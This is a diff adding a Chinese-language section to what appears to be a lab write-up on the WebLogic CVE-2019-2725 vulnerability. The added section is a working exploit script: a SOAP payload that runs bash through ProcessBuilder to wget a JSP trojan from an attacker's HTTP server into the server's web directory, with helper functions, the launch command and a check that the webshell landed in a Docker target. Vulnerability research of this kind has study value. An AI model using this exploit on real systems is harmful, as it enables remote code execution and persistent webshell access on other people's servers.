@@ -244,6 +244,118 @@ else:
   url = options.URL+':'+options.PORT
   checking(url)
 ```
+测试
+
+`python3 poc.py -f IP_test.txt -p`
+
+检测出存在CVE-2019-2725漏洞
+
+### 脚本攻击
+
+首先定义HTTP请求的headers和data
+
+```
+headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0',
+           'SOAPAction': 'Accept: */*',
+           'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)',
+           'content-type': 'text/xml'}
+data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
+xmlns:asy="http://www.bea.com/async/AsyncResponseService">
+<soapenv:Header>
+<wsa:Action>xx</wsa:Action>
+<wsa:RelatesTo>xx</wsa:RelatesTo>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<void class="java.lang.ProcessBuilder">
+<array class="java.lang.String" length="3">
+<void index="0">
+<string>/bin/bash</string>
+</void>
+<void index="1">
+<string>-c</string>
+</void>
+<void index="2">
+<string>wget {0} -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/{1}/war/3.jsp</string>
+</void>
+</array>
+<void method="start"/></void>
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body>
+<asy:onAsyncDelivery/>
+</soapenv:Body></soapenv:Envelope>'''.format(options.LOCATE, route(url + url_route + '?info'))
+```
+
+获取WebLogic中间件版本目录
+
+```
+#获得weblogic中间的版本目录
+def route(url):
+  print('[*] 获得路径中')
+  try:
+    #print('[*] 目标地址:'+url)
+    respond = requests.get(url)
+    if respond.status_code == 200:
+      route = str(respond.text)
+      start = route.index('async_response/')
+      #print(start)
+      if start >= 0:
+        start += len('async_response/')
+      #print(start)
+      end = route.index('/war')
+      #print(end)
+      #print(route[start:end])
+      return route[start:end];
+    else:
+      print("[-] 路径获取失败")
+      exit()
+  except Exception as e:
+    print("[-]{0}连接失败".format(url))
+    exit()
+```
+
+实现发送HTTP请求，获得WebLogic中间件版本目录
+
+从攻击者http服务器中下载木马文件
+
+```
+def acquire(url):
+  print('[*] 目标地址:'+url)
+  print('[*] 攻击者地址:'+options.LOCATE)
+  try:
+    respond = requests.post(url+url_route,headers=headers,data = data)
+    #print(respond.status_code)
+    if respond.status_code == 202:
+      print('[+] 木马下载成功')
+    else:
+      print('[-] 下载失败')
+      exit()
+  except Exception as e:
+    print("[-]{0}连接失败".format(url))
+    exit()
+```
+
+本地启动简易的http服务器，代理木马文件attackjsp.txt
+
+`python3 -m http.server 8000`
+
+部署好木马服务器后执行攻击脚本
+
+```
+python3 exp.py -u <target_url> -p <target_port> -l <service_script>
+#<target_url> 替换为目标的URL地址，<target_port> 替换为目标的端口号，<service_script> 替换为服务脚本的位置。
+```
+
+木马服务器显示收到请求
+
+此时查看受害者服务器中是否下载了木马程序
+
+```
+docker ps
+docker exec -it ec8fb7023c85 bash
+
+cd user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war
+```
+
 
 ## 漏洞修复
 
